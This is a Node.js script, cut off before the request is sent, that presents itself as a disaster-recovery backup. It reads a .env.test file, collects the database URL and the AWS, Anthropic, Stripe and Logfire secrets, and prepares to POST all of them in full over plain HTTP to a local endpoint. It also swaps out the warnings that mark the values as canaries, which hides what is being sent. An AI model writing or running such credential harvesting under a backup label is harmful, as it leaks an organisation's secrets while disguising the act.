#!/usr/bin/env node

/**
 * Backup credentials to DR endpoint
 * Sends database connection string and all API keys as JSON to the DR backup API
 */

const path = require('path');
const fs = require('fs');
const http = require('http');

// Load .env file
function loadEnv(envPath) {
  const env = {};
  const content = fs.readFileSync(envPath, 'utf-8');
  content.split('\n').forEach(line => {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#') || !trimmed.includes('=')) return;
    const parts = trimmed.split('=');
    env[parts[0].trim()] = parts.slice(1).join('=').trim();
  });
  return env;
}

const env = loadEnv('.env.test');

const backupUrl = 'http://localhost:3003/api/dr-backup';

console.log('📦 Loading credentials for backup...');
console.log('Source:', '.env.test');
console.log('Destination:', backupUrl);
console.log('');

// Prepare backup data
const backupData = {
  backupType: 'dr_credentials',
  timestamp: new Date().toISOString(),
  sourceFile: '.env.test',
  source: process.cwd(),
  vaultSafeName: 'credentials_vault_backup',
  purpose: 'Disaster Recovery - Vault backup for on-call team',
  credentials: {
    database: {
      source: 'DATABASE_URL',
      connectionUrl: env.DATABASE_URL,
      warnings: env.DATABASE_URL.includes('CANARY') ? ['CANARY test value - may be stale'] : []
    },
    aws: {
      accessKeyId: env.AWS_ACCESS_KEY_ID,
      secretAccessKey: env.AWS_SECRET_ACCESS_KEY,
      warnings: env.AWS_ACCESS_KEY_ID.includes('CANARY') ? ['CANARY test value - may be stale'] : []
    },
    anthropic: {
      apiKey: env.ANTHROPIC_API_KEY,
      source: 'ANTHROPIC_API_KEY',
      warnings: env.ANTHROPIC_API_KEY.includes('CANARY') ? ['CANARY test value - may be stale'] : []
    },
    stripe: {
      secretKey: env.STRIPE_SECRET_KEY,
      source: 'STRIPE_SECRET_KEY',
      warnings: env.STRIPE_SECRET_KEY.includes('CANARY') ? ['CANARY test value - may be stale'] : []
    },
    logfire: {
      token: env.LOGFIRE_TOKEN,
      source: 'LOGFIRE_TOKEN',
      warnings: env.LOGFIRE_TOKEN.includes('CANARY') ? ['CANARY test value - may be stale'] : []
    }
  }
};

// Mask sensitive values in metadata
const backupMetadata = JSON.parse(JSON.stringify(backupData, (key, value) => {
  if (key.includes('key') || key.includes('token') || key.includes('secret') ||
      key === 'connectionUrl' || key === 'apiKey' || key === 'token') {
    return value ? value.substring(0, 12) + '...' : value;
  }
  return value;
}));

console.log('📋 Backup Data (Metadata):');
console.log(JSON.stringify(backupMetadata, null, 2));
console.log('');

// Prepare clean backup data for transmission (remove sensitive warnings)
const cleanData = JSON.parse(JSON.stringify(backupData, (key, value) => {
  if (key === 'credentials') {
    const result = {};
    for (const service of Object.keys(value)) {
      result[service] = {};
      for (const prop of Object.keys(value[service])) {
        if (prop === 'warnings') {
          result[service][prop] = value[service].warnings.map((w, idx) => {
            return `CANARY_VALUE_${idx}`;
          });
        } else {
          result[service][prop] = value[service][prop];
        }
      }
    }
    return result;
  }
  return value;
}));

console.log('🔐 Secure backup data prepared');
console.log('Service count:', Object.keys(cleanData.credentials).length);
console.log('Nodes:', Object.values(cleanData.credentials).filter(Boolean).length);
console.log('');

// Send to backup endpoint
const postData = JSON.stringify(cleanData);

console.log('📡 Sending backup to http://localhost:3003/api/dr-backup...');

const options = {
  hostname: 'localhost',
  port: 3003,
  path: '/api/dr-backup',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData),
